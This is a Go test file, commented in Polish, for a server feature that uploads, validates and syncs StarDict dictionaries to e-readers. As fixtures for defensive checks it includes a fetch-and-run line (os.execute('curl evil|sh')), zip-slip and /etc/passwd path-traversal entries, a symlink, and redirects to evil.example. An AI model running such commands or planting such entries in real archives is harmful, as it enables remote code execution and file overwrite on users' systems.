package main

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/klauspost/compress/zstd"
)

// starDict: minimalny, ale kompletny słownik StarDict (ifo + idx + dict.dz).
func starDict(base, title string) map[string][]byte {
	return map[string][]byte{
		base + ".ifo":     []byte("StarDict's dict ifo file\nversion=2.4.2\nwordcount=2\nidxfilesize=20\nbookname=" + title + "\nsametypesequence=h\n"),
		base + ".idx":     bytes.Repeat([]byte{'i'}, 40),
		base + ".dict.dz": bytes.Repeat([]byte{'d'}, 64),
	}
}

type fileSet map[string][]byte

func (f fileSet) names() []string {
	out := make([]string, 0, len(f))
	for n := range f {
		out = append(out, n)
	}
	sort.Strings(out)
	return out
}

func zipOf(t *testing.T, files fileSet) []byte {
	t.Helper()
	var b bytes.Buffer
	zw := zip.NewWriter(&b)
	for _, n := range files.names() {
		w, err := zw.Create(n)
		if err != nil {
			t.Fatal(err)
		}
		w.Write(files[n])
	}
	zw.Close()
	return b.Bytes()
}

func tarOf(t *testing.T, files fileSet, extra ...*tar.Header) []byte {
	t.Helper()
	var b bytes.Buffer
	tw := tar.NewWriter(&b)
	for _, n := range files.names() {
		tw.WriteHeader(&tar.Header{Name: n, Mode: 0o644, Size: int64(len(files[n])), Typeflag: tar.TypeReg})
		tw.Write(files[n])
	}
	for _, h := range extra {
		tw.WriteHeader(h)
	}
	tw.Close()
	return b.Bytes()
}

func gzOf(b []byte) []byte {
	var out bytes.Buffer
	gw := gzip.NewWriter(&out)
	gw.Write(b)
	gw.Close()
	return out.Bytes()
}

func zstOf(t *testing.T, b []byte) []byte {
	t.Helper()
	var out bytes.Buffer
	zw, err := zstd.NewWriter(&out)
	if err != nil {
		t.Fatal(err)
	}
	zw.Write(b)
	zw.Close()
	return out.Bytes()
}

func withPrefix(prefix string, f map[string][]byte) fileSet {
	out := fileSet{}
	for n, b := range f {
		out[prefix+n] = b
	}
	return out
}

// normalize zapisuje bajty do pliku i woła normalizeDict; zwraca wpisy powstałego ZIP-a.
func normalize(t *testing.T, raw []byte, name string) (map[string][]byte, dictMeta, error) {
	t.Helper()
	dir := t.TempDir()
	src, dst := filepath.Join(dir, "src"), filepath.Join(dir, "out.zip")
	os.WriteFile(src, raw, 0o600)
	sha, meta, err := normalizeDict(src, dst, name)
	if err != nil {
		if _, serr := os.Stat(dst); serr == nil {
			t.Errorf("po błędzie został plik wynikowy")
		}
		return nil, meta, err
	}
	b, _ := os.ReadFile(dst)
	sum := sha256.Sum256(b)
	if hex.EncodeToString(sum[:]) != sha {
		t.Errorf("sha256 zwrócone przez normalizeDict nie zgadza się z plikiem")
	}
	zr, err := zip.NewReader(bytes.NewReader(b), int64(len(b)))
	if err != nil {
		t.Fatal(err)
	}
	got := map[string][]byte{}
	for _, f := range zr.File {
		if f.FileInfo().IsDir() {
			continue
		}
		rc, _ := f.Open()
		got[f.Name], _ = io.ReadAll(rc)
		rc.Close()
	}
	return got, meta, nil
}

func TestDictNormalizeFormats(t *testing.T) {
	base := starDict("gcide", "GNU Dictionary")
	root := withPrefix("gcide/", base)
	flat := fileSet(base)
	cases := map[string][]byte{
		"zip z katalogiem":     zipOf(t, root),
		"zip płaski":           zipOf(t, flat),
		"tar":                  tarOf(t, root),
		"tar.gz":               gzOf(tarOf(t, root)),
		"tar.zst":              zstOf(t, tarOf(t, root)),
		"tar.zst bez katalogu": zstOf(t, tarOf(t, flat)),
	}
	for label, raw := range cases {
		got, meta, err := normalize(t, raw, "Mój słownik")
		if err != nil {
			t.Errorf("%s: %v", label, err)
			continue
		}
		want := []string{"Mój słownik/gcide.dict.dz", "Mój słownik/gcide.idx", "Mój słownik/gcide.ifo"}
		var have []string
		for n := range got {
			have = append(have, n)
		}
		sort.Strings(have)
		if strings.Join(have, "|") != strings.Join(want, "|") {
			t.Errorf("%s: wpisy %v", label, have)
		}
		if meta.Title != "GNU Dictionary" || meta.Words != 2 || meta.Dropped != 0 {
			t.Errorf("%s: meta %+v", label, meta)
		}
		if !bytes.Equal(got["Mój słownik/gcide.idx"], base["gcide.idx"]) {
			t.Errorf("%s: zawartość .idx zmieniona", label)
		}
	}
}

// Ta sama zawartość i kolejność → ten sam sha (idempotentne dodawanie).
func TestDictNormalizeDeterministic(t *testing.T) {
	raw := zipOf(t, withPrefix("d/", starDict("d", "D")))
	dir := t.TempDir()
	src := filepath.Join(dir, "s")
	os.WriteFile(src, raw, 0o600)
	a, _, err1 := normalizeDict(src, filepath.Join(dir, "a.zip"), "D")
	time.Sleep(1100 * time.Millisecond) // zegar nie może wchodzić do ZIP-a
	b, _, err2 := normalizeDict(src, filepath.Join(dir, "b.zip"), "D")
	if err1 != nil || err2 != nil || a != b {
		t.Fatalf("sha: %v %v (%v %v)", a, b, err1, err2)
	}
}

// Pliki .lua KOReader wykonuje jako kod (fix_html_func) — muszą zniknąć, także w
// wariantach zapisu, które po drodze (FAT, wielkość liter, podwójne rozszerzenie) dają .lua.
func TestDictDropsLua(t *testing.T) {
	files := withPrefix("d/", starDict("d", "D"))
	for _, n := range []string{"d/d.lua", "d/d.LUA", "d/d.Lua", "d/d.lua.gz", "d/d.lua.dz", "d/README", "d/LICENSE", "d/run.sh", "d/x.so"} {
		files[n] = []byte("os.execute('curl evil|sh')")
	}
	files["d/.DS_Store"] = []byte("x")
	files["__MACOSX/d/._d.ifo"] = []byte("x")
	files["d/d.css"] = []byte("b{}")
	files["d/res/a.png"] = []byte("png")
	got, meta, err := normalize(t, zipOf(t, files), "D")
	if err != nil {
		t.Fatal(err)
	}
	var have []string
	for n := range got {
		have = append(have, n)
	}
	sort.Strings(have)
	want := []string{"D/d.css", "D/d.dict.dz", "D/d.idx", "D/d.ifo", "D/res/a.png"}
	if strings.Join(have, "|") != strings.Join(want, "|") {
		t.Errorf("wpisy %v, chcę %v", have, want)
	}
	if meta.Dropped != 9 {
		t.Errorf("pominięte: %d, chcę 9", meta.Dropped)
	}
}

// Nazwy, które FAT/NTFS skracają do .lua albo zmieniają, odrzucamy w całości.
func TestDictRejectsFilesystemTricks(t *testing.T) {
	bad := []string{
		"d/d.lua.", "d/d.lua ", "d/d.lua. .", "d/a:b.ifo", "d/d.lua:x", "d/d*.idx", "d/d?.idx",
		"d/<d>.ifo", "d/d|.ifo", "d/sub./d.ifo", "d/d\x01.ifo", "d/d\x7f.ifo",
	}
	for _, n := range bad {
		files := withPrefix("d/", starDict("d", "D"))
		files[n] = []byte("x")
		if _, _, err := normalize(t, zipOf(t, files), "D"); err == nil {
			t.Errorf("%q przyjęte", n)
		}
	}
}

func TestDictNormalizeRejects(t *testing.T) {
	good := starDict("d", "D")
	mut := func(f func(fileSet)) fileSet {
		m := fileSet{}
		for k, v := range good {
			m[k] = v
		}
		f(m)
		return m
	}
	cases := map[string][]byte{
		"brak .idx":           zipOf(t, mut(func(m fileSet) { delete(m, "d.idx") })),
		"brak .dict":          zipOf(t, mut(func(m fileSet) { delete(m, "d.dict.dz") })),
		"brak .ifo":           zipOf(t, mut(func(m fileSet) { delete(m, "d.ifo") })),
		"zły nagłówek .ifo":   zipOf(t, mut(func(m fileSet) { m["d.ifo"] = []byte("hello") })),
		"idx innej nazwy":     zipOf(t, mut(func(m fileSet) { m["x.idx"] = m["d.idx"]; delete(m, "d.idx") })),
		"zip-slip":            zipOf(t, mut(func(m fileSet) { m["../../etc/cron.d/x"] = []byte("x") })),
		"ścieżka absolutna":   tarOf(t, mut(func(m fileSet) { m["/etc/passwd"] = []byte("x") })),
		"backslash":           zipOf(t, mut(func(m fileSet) { m[`a\..\b`] = []byte("x") })),
		"pusty":               zipOf(t, fileSet{}),
		"śmieci":              []byte("to nie jest archiwum, tylko zwykły tekst, dłuższy niż nagłówek"),
		"pusty plik":          {},
		"symlink w tar":       tarOf(t, good, &tar.Header{Name: "d.link", Linkname: "/etc/passwd", Typeflag: tar.TypeSymlink}),
		"hardlink w tar":      tarOf(t, good, &tar.Header{Name: "d.hl", Linkname: "d.ifo", Typeflag: tar.TypeLink}),
		"urządzenie w tar":    tarOf(t, good, &tar.Header{Name: "d.dev", Typeflag: tar.TypeChar}),
		"zepsuty gzip":        append(gzOf(tarOf(t, good))[:30], bytes.Repeat([]byte{0xff}, 200)...),
		"zepsuty zstd":        append(zstOf(t, tarOf(t, good))[:20], bytes.Repeat([]byte{0xff}, 200)...),
		"za głęboka ścieżka":  zipOf(t, mut(func(m fileSet) { m["a/b/c/d/e/f/g/h.txt"] = []byte("x") })),
		"powtórka (wielkość)": zipOf(t, mut(func(m fileSet) { m["D.IFO"] = m["d.ifo"] })),
	}
	for label, raw := range cases {
		if _, _, err := normalize(t, raw, "D"); err == nil {
			t.Errorf("%s: przyjęto, a miało być odrzucone", label)
		} else if _, ok := err.(*badDict); !ok && label != "zepsuty gzip" && label != "zepsuty zstd" {
			t.Errorf("%s: błąd %T (%v) nie jest *badDict", label, err, err)
		}
	}
	for _, name := range []string{"", ".ukryty", "a/b", "../x", "x..y", "koniec.", "koniec ", "dwie  spacje", strings.Repeat("a", 97), "a\x00b", "a\nb"} {
		if _, _, err := normalize(t, zipOf(t, good), name); err == nil {
			t.Errorf("nazwa %q przyjęta", name)
		}
	}
	for _, name := range []string{"Wiktionary", "Mój słownik (en-pl)", "วิกิพจนานุกรม ภาษาไทย", "ウィクショナリー セルビア・クロアチア語", "a_b-c+d, e's & f.2"} {
		if err := checkDictName(name); err != nil {
			t.Errorf("nazwa %q odrzucona: %v", name, err)
		}
	}
}

func TestDictLimits(t *testing.T) {
	good := starDict("d", "D")
	many := fileSet{}
	for k, v := range good {
		many[k] = v
	}
	for i := 0; i <= dictMaxFiles; i++ {
		many["res/"+strings.Repeat("x", 5)+string(rune('a'+i%26))+string(rune('a'+i/26%26))+string(rune('a'+i/676%26))+".png"] = []byte{1}
	}
	if _, _, err := normalize(t, zipOf(t, many), "D"); err == nil || !strings.Contains(err.Error(), "limit") {
		t.Errorf("za dużo plików: %v", err)
	}
}

func TestDictSanitizeName(t *testing.T) {
	for in, want := range map[string]string{
		"Hello/World":            "Hello World",
		"  ..a..b..  ":           "a.b",
		"CC: BY*SA?":             "CC BY SA",
		"stardict-gcide-2.4.2":   "stardict-gcide-2.4.2",
		"":                       "",
		strings.Repeat("ż", 120): strings.Repeat("ż", 96),
	} {
		got := sanitizeDictName(in)
		if got != want {
			t.Errorf("sanitize(%q) = %q, chcę %q", in, got, want)
		}
		if got != "" {
			if err := checkDictName(got); err != nil {
				t.Errorf("sanitize(%q) = %q nie przechodzi checkDictName: %v", in, got, err)
			}
		}
	}
}

// --- HTTP ---

func (e *pluginEnv) dictUpload(fields map[string]string, files ...[2]string) (int, map[string]any) {
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	for _, f := range files {
		fw, _ := mw.CreateFormFile("file", f[0])
		fw.Write([]byte(f[1]))
	}
	for k, v := range fields {
		mw.WriteField(k, v)
	}
	mw.Close()
	rec := e.do(e.admin, "POST", "/api/admin/dicts", &buf, mw.FormDataContentType())
	var out map[string]any
	json.Unmarshal(rec.Body.Bytes(), &out)
	return rec.Code, out
}

func (e *pluginEnv) dictOK(file string, raw []byte, name string) map[string]any {
	e.t.Helper()
	fields := map[string]string{}
	if name != "" {
		fields["name"] = name
	}
	c, out := e.dictUpload(fields, [2]string{file, string(raw)})
	if c != 200 {
		e.t.Fatalf("upload słownika %s: %d %v", file, c, out)
	}
	return out["dict"].(map[string]any)
}

func (e *pluginEnv) syncDicts(tok string, allowed bool) map[string]any {
	path := "/api/v1/sync"
	if allowed {
		path += "?dicts_allowed=1"
	}
	rec := e.do(tok, "GET", path, bytes.NewReader(nil), "")
	var out map[string]any
	json.Unmarshal(rec.Body.Bytes(), &out)
	return out
}

func TestDictUploadSyncAndConsent(t *testing.T) {
	e := newPluginEnv(t)
	_, tok, _ := e.s.st.Provision("Kobo", "", "", "")

	d := e.dictOK("GCIDE.tar.zst", zstOf(t, tarOf(t, withPrefix("gcide/", starDict("gcide", "GNU Dictionary")))), "")
	if d["name"] != "GCIDE" || d["title"] != "GNU Dictionary" || d["source"] != SrcUpload || d["approved"] != true {
		t.Fatalf("wpis po uploadzie: %v", d)
	}
	sha := d["sha256"].(string)

	// Bez zgody czytnika: ani lista, ani plik.
	if out := e.syncDicts(tok, false); out["dicts"] != nil {
		t.Errorf("bez zgody lista nie powinna wracać: %v", out["dicts"])
	}
	if rec := e.do(tok, "GET", "/api/v1/dicts/"+sha, bytes.NewReader(nil), ""); rec.Code != 403 {
		t.Errorf("pobranie bez zgody: %d", rec.Code)
	}
	// Za zgodą: lista i plik, a plik zgadza się z sha256.
	ds, _ := e.syncDicts(tok, true)["dicts"].([]any)
	if len(ds) != 1 {
		t.Fatalf("cel czytnika: %v", ds)
	}
	w := ds[0].(map[string]any)
	if w["name"] != "GCIDE" || w["sha256"] != sha || w["url"] != "/api/v1/dicts/"+sha || w["size"].(float64) <= 0 || w["unpacked"].(float64) <= 0 {
		t.Errorf("wpis celu: %v", w)
	}
	rec := e.do(tok, "GET", "/api/v1/dicts/"+sha, bytes.NewReader(nil), "")
	sum := sha256.Sum256(rec.Body.Bytes())
	if rec.Code != 200 || hex.EncodeToString(sum[:]) != sha || rec.Header().Get("Content-Type") != "application/zip" {
		t.Errorf("pobranie: %d, sha %x", rec.Code, sum[:4])
	}
	for _, bad := range []string{"zzz", strings.Repeat("0", 64)} {
		if rec := e.do(tok, "GET", "/api/v1/dicts/"+bad, bytes.NewReader(nil), ""); rec.Code != 404 {
			t.Errorf("pobranie %q: %d", bad, rec.Code)
		}
	}
	// Zgoda jest zapamiętana w urządzeniu, a wycofanie jej też.
	if !e.s.st.S.Devices[firstDev(e.s.st)].DictsAllowed {
		t.Error("zgoda niezapisana")
	}
	e.syncDicts(tok, false)
	if e.s.st.S.Devices[firstDev(e.s.st)].DictsAllowed {
		t.Error("wycofana zgoda nadal zapisana")
	}
	// Bez tokenu urządzenia i admina: 401.
	if rec := e.do("nope", "GET", "/api/v1/dicts/"+sha, bytes.NewReader(nil), ""); rec.Code != 401 {
		t.Errorf("zły token: %d", rec.Code)
	}
	if rec := e.do("nope", "GET", "/api/admin/dicts", bytes.NewReader(nil), ""); rec.Code != 401 {
		t.Errorf("lista bez admina: %d", rec.Code)
	}
}

func firstDev(st *Store) string {
	st.mu.Lock()
	defer st.mu.Unlock()
	for id := range st.S.Devices {
		return id
	}
	return ""
}

// Nowa wersja o tej samej nazwie zastępuje starą (z plikiem), a usunięcie czyści magazyn.
func TestDictSupersedeAndDelete(t *testing.T) {
	e := newPluginEnv(t)
	v1 := e.dictOK("a.zip", zipOf(t, withPrefix("x/", starDict("x", "Stary"))), "Słownik")["sha256"].(string)
	same := e.dictOK("a.zip", zipOf(t, withPrefix("x/", starDict("x", "Stary"))), "Słownik")["sha256"].(string)
	if same != v1 || len(e.s.st.ListDicts()) != 1 {
		t.Fatalf("ten sam plik dwa razy: %s vs %s, %d wersji", same, v1, len(e.s.st.ListDicts()))
	}
	nd := starDict("x", "Nowy")
	nd["x.idx"] = bytes.Repeat([]byte{'n'}, 50)
	v2 := e.dictOK("b.zip", zipOf(t, withPrefix("x/", nd)), "Słownik")["sha256"].(string)
	list := e.s.st.ListDicts()
	if v2 == v1 || len(list) != 1 || list[0].SHA256 != v2 || !list[0].Active || list[0].Title != "Nowy" {
		t.Fatalf("po nowej wersji: %+v", list)
	}
	if _, err := os.Stat(e.s.st.dictPath(v1)); err == nil {
		t.Error("stary plik został w magazynie")
	}
	if _, err := os.Stat(e.s.st.dictPath(v2)); err != nil {
		t.Error("nowego pliku nie ma w magazynie")
	}
	if c, _ := e.jsonDo(e.admin, "DELETE", "/api/admin/dicts/"+v2, nil); c != 200 {
		t.Errorf("usunięcie: %d", c)
	}
	if c, _ := e.jsonDo(e.admin, "DELETE", "/api/admin/dicts/"+v2, nil); c != 404 {
		t.Errorf("usunięcie drugi raz: %d", c)
	}
	if _, err := os.Stat(e.s.st.dictPath(v2)); err == nil {
		t.Error("plik po usunięciu został")
	}
	if len(e.s.st.ListDicts()) != 0 {
		t.Error("wpis po usunięciu został")
	}
}

func TestDictLooseFilesUpload(t *testing.T) {
	e := newPluginEnv(t)
	sd := starDict("wordnet", "WordNet")
	c, out := e.dictUpload(nil,
		[2]string{"wordnet.ifo", string(sd["wordnet.ifo"])},
		[2]string{"wordnet.idx", string(sd["wordnet.idx"])},
		[2]string{"wordnet.dict.dz", string(sd["wordnet.dict.dz"])})
	if c != 200 {
		t.Fatalf("luźne pliki: %d %v", c, out)
	}
	d := out["dict"].(map[string]any)
	if d["name"] != "wordnet" || d["title"] != "WordNet" {
		t.Errorf("wpis: %v", d)
	}
	// Niekompletny zestaw → 400.
	if c, _ := e.dictUpload(nil, [2]string{"a.ifo", string(sd["wordnet.ifo"])}, [2]string{"a.idx", "x"}); c != 400 {
		t.Errorf("niekompletne: %d", c)
	}
	// Nie archiwum, jedna część → 400.
	if c, _ := e.dictUpload(nil, [2]string{"a.txt", "to nie archiwum, ale wystarczająco długi tekst"}); c != 400 {
		t.Errorf("tekst: %d", c)
	}
	// Brak pola file → 400. Zła nazwa z pola → 400.
	if c, _ := e.dictUpload(map[string]string{"name": "../x"}, [2]string{"a.zip", string(zipOf(t, starDict("a", "A")))}); c != 400 {
		t.Errorf("zła nazwa: %d", c)
	}
}

func TestDictReport(t *testing.T) {
	e := newPluginEnv(t)
	_, tok, _ := e.s.st.Provision("Kobo", "", "", "")
	good := strings.Repeat("a", 64)
	body := map[string]any{"dicts": map[string]any{"installed": []map[string]string{
		{"name": "Dobry", "sha256": good},
		{"name": "../zły", "sha256": good},
		{"name": "Zły sha", "sha256": "xyz"},
	}}}
	b, _ := json.Marshal(body)
	rec := e.do(tok, "POST", "/api/v1/sync", bytes.NewReader(b), "application/json")
	if rec.Code != 200 {
		t.Fatalf("POST sync: %d %s", rec.Code, rec.Body)
	}
	d := e.s.st.S.Devices[firstDev(e.s.st)]
	if len(d.DictInventory) != 1 || d.DictInventory[0].Name != "Dobry" || d.DictReportAt == nil {
		t.Errorf("inwentarz: %+v", d.DictInventory)
	}
}

// Słowniki nie jadą w archiwum przenosin (PC-020), a import ich nie kasuje.
func TestDictsStayOutOfTransfer(t *testing.T) {
	e := newPluginEnv(t)
	e.dictOK("a.zip", zipOf(t, starDict("a", "A")), "A")
	var buf bytes.Buffer
	if err := ExportArchive(e.s.st, &buf); err != nil {
		t.Fatal(err)
	}
	s, _, _, _, err := readArchive(&buf)
	if err != nil {
		t.Fatal(err)
	}
	if len(s.Dicts) != 0 {
		t.Errorf("archiwum niesie słowniki: %v", s.Dicts)
	}
	if len(e.s.st.ListDicts()) != 1 {
		t.Error("eksport zmienił magazyn")
	}
}

// --- katalog ---

func TestDictCatalogIntegrity(t *testing.T) {
	if len(dictCatalogList) < 100 {
		t.Fatalf("katalog ma %d pozycji", len(dictCatalogList))
	}
	ids, folders := map[string]bool{}, map[string]string{}
	for _, c := range dictCatalogList {
		if ids[c.ID] || len(c.ID) != 12 {
			t.Errorf("powtórzone albo złe ID %q", c.ID)
		}
		ids[c.ID] = true
		if c.Name == "" || c.LangIn == "" || c.LangOut == "" || c.Origin == "" {
			t.Errorf("%s: brak pól", c.ID)
		}
		if err := checkDictName(c.Folder); err != nil {
			t.Errorf("%s: folder %q: %v", c.ID, c.Folder, err)
		}
		if prev, dup := folders[strings.ToLower(c.Folder)]; dup {
			t.Errorf("folder %q w %s i %s — kolidowałby na czytniku", c.Folder, prev, c.ID)
		}
		folders[strings.ToLower(c.Folder)] = c.ID
		u, err := url.Parse(c.URL)
		if err != nil || u.Scheme != "https" || !dictAllowedHosts[u.Host] || u.User != nil {
			t.Errorf("%s: adres %q poza listą dozwolonych hostów", c.ID, c.URL)
		}
	}
}

type dictCatEnv struct {
	*pluginEnv
	srv  *httptest.Server
	body map[string][]byte
}

// newDictCatEnv: serwer udający hosta słowników + katalog z kilkoma pozycjami.
func newDictCatEnv(t *testing.T) *dictCatEnv {
	e := &dictCatEnv{pluginEnv: newPluginEnv(t), body: map[string][]byte{}}
	e.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/redir-evil":
			http.Redirect(w, r, "http://evil.example/x.zip", 302)
			return
		case "/redir-ok":
			http.Redirect(w, r, "/ok.zip", 302)
			return
		case "/huge":
			w.Header().Set("Content-Length", "999999999999")
			return
		}
		b, ok := e.body[r.URL.Path]
		if !ok {
			http.NotFound(w, r)
			return
		}
		w.Write(b)
	}))
	host := strings.TrimPrefix(e.srv.URL, "http://")
	oldList, oldHosts, oldHTTP := dictCatalogList, dictAllowedHosts, dictTestHTTP
	dictAllowedHosts, dictTestHTTP = map[string]bool{host: true}, true
	dictJobPool.mu.Lock()
	dictJobPool.m = map[string]*dictJob{}
	dictJobPool.mu.Unlock()
	t.Cleanup(func() {
		e.srv.Close()
		dictCatalogList, dictAllowedHosts, dictTestHTTP = oldList, oldHosts, oldHTTP
	})
	e.body["/ok.zip"] = zipOf(t, withPrefix("kat/", starDict("kat", "Z katalogu")))
	e.body["/junk.zip"] = []byte("to nie jest archiwum, tylko zwykły tekst, dłuższy niż nagłówek")
	e.body["/tgz"] = gzOf(tarOf(t, withPrefix("kat/", starDict("kat", "Z katalogu tgz"))))
	mk := func(id, name, path string) CatalogDict {
		return CatalogDict{ID: id, Name: name, Folder: name, LangIn: "eng", LangOut: "pol", URL: e.srv.URL + path, Origin: "koreader"}
	}
	dictCatalogList = []CatalogDict{
		mk("ok", "Dobry", "/ok.zip"),
		mk("redirok", "Przekierowany", "/redir-ok"),
		mk("evil", "Zły", "/redir-evil"),
		mk("junk", "Śmieci", "/junk.zip"),
		mk("missing", "Brak", "/nie-ma.zip"),
		mk("huge", "Ogromny", "/huge"),
		{ID: "obcy", Name: "Obcy", Folder: "Obcy", URL: "https://evil.example/a.zip", Origin: "koreader"},
	}
	return e
}

// waitJob czeka, aż zadanie zniknie (sukces) albo skończy się błędem.
func (e *dictCatEnv) waitJob(id string) (map[string]any, bool) {
	e.t.Helper()
	for i := 0; i < 400; i++ {
		_, out := e.jsonDo(e.admin, "GET", "/api/admin/dicts", nil)
		jobs, _ := out["jobs"].(map[string]any)
		j, running := jobs[id].(map[string]any)
		if !running {
			return nil, true
		}
		if j["state"] == "błąd" {
			return j, false
		}
		time.Sleep(10 * time.Millisecond)
	}
	e.t.Fatalf("zadanie %s nie skończyło się", id)
	return nil, false
}

func TestDictCatalogDownload(t *testing.T) {
	e := newDictCatEnv(t)
	c, out := e.jsonDo(e.admin, "GET", "/api/admin/dict-catalog", nil)
	if list, _ := out["dicts"].([]any); c != 200 || len(list) != len(dictCatalogList) {
		t.Fatalf("katalog: %d %v", c, out)
	}
	for _, id := range []string{"ok", "redirok"} {
		if c, out = e.jsonDo(e.admin, "POST", "/api/admin/dict-catalog/"+id, nil); c != 202 {
			t.Fatalf("start %s: %d %v", id, c, out)
		}
		if j, ok := e.waitJob(id); !ok {
			t.Fatalf("%s: błąd %v", id, j)
		}
	}
	list := e.s.st.ListDicts()
	if len(list) != 2 {
		t.Fatalf("magazyn: %+v", list)
	}
	byName := map[string]DictFile{}
	for _, d := range list {
		byName[d.Name] = d
	}
	d := byName["Dobry"]
	if d.Source != SrcCatalog || d.SourceRef != "ok" || d.Title != "Z katalogu" || !d.Approved || !d.Active {
		t.Errorf("wpis z katalogu: %+v", d)
	}
	// Idzie na czytnik za zgodą.
	_, tok, _ := e.s.st.Provision("Kobo", "", "", "")
	if ds, _ := e.syncDicts(tok, true)["dicts"].([]any); len(ds) != 2 {
		t.Errorf("cel czytnika: %v", ds)
	}
}

func TestDictCatalogRejects(t *testing.T) {
	e := newDictCatEnv(t)
	if c, _ := e.jsonDo(e.admin, "POST", "/api/admin/dict-catalog/nieistnieje", nil); c != 404 {
		t.Errorf("nieznane id: %d", c)
	}
	for id, want := range map[string]string{
		"evil":    "dozwolonych hostów", // przekierowanie poza listę
		"obcy":    "dozwolonych hostów", // adres katalogu poza listą
		"junk":    "StarDict",           // nie archiwum
		"missing": "404",
		"huge":    "MB",
	} {
		if c, out := e.jsonDo(e.admin, "POST", "/api/admin/dict-catalog/"+id, nil); c != 202 {
			t.Fatalf("start %s: %d %v", id, c, out)
		}
		j, ok := e.waitJob(id)
		if ok {
			t.Errorf("%s: zadanie się udało", id)
			continue
		}
		if msg, _ := j["error"].(string); !strings.Contains(msg, want) && !strings.Contains(msg, "archiwum") {
			t.Errorf("%s: komunikat %q, oczekiwałem „%s”", id, msg, want)
		}
	}
	if n := len(e.s.st.ListDicts()); n != 0 {
		t.Errorf("odrzucone weszły do magazynu: %d", n)
	}
	// Ponowna próba po błędzie działa (zadanie z błędem nie blokuje).
	e.body["/nie-ma.zip"] = zipOf(t, withPrefix("kat/", starDict("kat", "Już jest")))
	e.jsonDo(e.admin, "POST", "/api/admin/dict-catalog/missing", nil)
	if j, ok := e.waitJob("missing"); !ok {
		t.Fatalf("ponowna próba: %v", j)
	}
	if len(e.s.st.ListDicts()) != 1 {
		t.Error("ponowna próba nie dodała słownika")
	}
}

// Dwa kliknięcia pod rząd nie startują dwóch pobrań.
func TestDictCatalogJobIdempotent(t *testing.T) {
	e := newDictCatEnv(t)
	gate := make(chan struct{})
	e.srv.Config.Handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		<-gate
		w.Write(e.body["/ok.zip"])
	})
	e.jsonDo(e.admin, "POST", "/api/admin/dict-catalog/ok", nil)
	e.jsonDo(e.admin, "POST", "/api/admin/dict-catalog/ok", nil)
	dictJobPool.mu.Lock()
	n := len(dictJobPool.m)
	dictJobPool.mu.Unlock()
	close(gate)
	if n != 1 {
		t.Errorf("zadań: %d", n)
	}
	if j, ok := e.waitJob("ok"); !ok {
		t.Fatalf("błąd: %v", j)
	}
}

func TestDictHostOK(t *testing.T) {
	for raw, want := range map[string]bool{
		"https://github.com/a/b.zip":              true,
		"http://github.com/a/b.zip":               false,
		"https://github.com:8443/a":               false,
		"https://user@github.com/a":               false,
		"https://evil.example/a":                  false,
		"https://github.com.evil.example/a":       false,
		"https://objects.githubusercontent.com/x": false, // start tylko z listy
		"https://127.0.0.1/a":                     false,
	} {
		u, _ := url.Parse(raw)
		if got := dictHostOK(u, false); got != want {
			t.Errorf("dictHostOK(%s, false) = %v", raw, got)
		}
	}
	u, _ := url.Parse("https://release-assets.githubusercontent.com/x")
	if !dictHostOK(u, true) || dictHostOK(u, false) {
		t.Error("CDN GitHuba tylko jako cel przekierowania")
	}
}
